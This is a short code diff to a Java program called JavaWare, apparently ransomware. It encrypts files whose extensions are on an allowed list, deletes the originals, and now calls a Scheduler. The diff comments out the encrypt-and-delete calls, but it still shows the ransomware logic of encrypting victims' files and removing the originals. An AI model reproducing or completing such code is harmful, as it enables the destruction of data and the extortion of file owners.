@@ -55,8 +55,8 @@ public class JavaWare {
                    //if file extension is allowed, encrypt file
                    FileTypes FileTypes = new FileTypes();
                    if(FileTypes.AllowedTypes.contains("." + fileType.toUpperCase())) {
-                       aes.encrypt(f);
-                       f.delete();
+                       //aes.encrypt(f);
+                       //f.delete();
                        System.out.println("Encrypting "+ f);
                    }
                }
@@ -98,7 +98,8 @@ public class JavaWare {
 
     public static void main(String[] args) throws Exception {
         JavaWare jw = new JavaWare();
-        jw.EncryptFiles();
-
+        //jw.EncryptFiles();
+        Scheduler s = new Scheduler();
+        s.function();
     }
 }
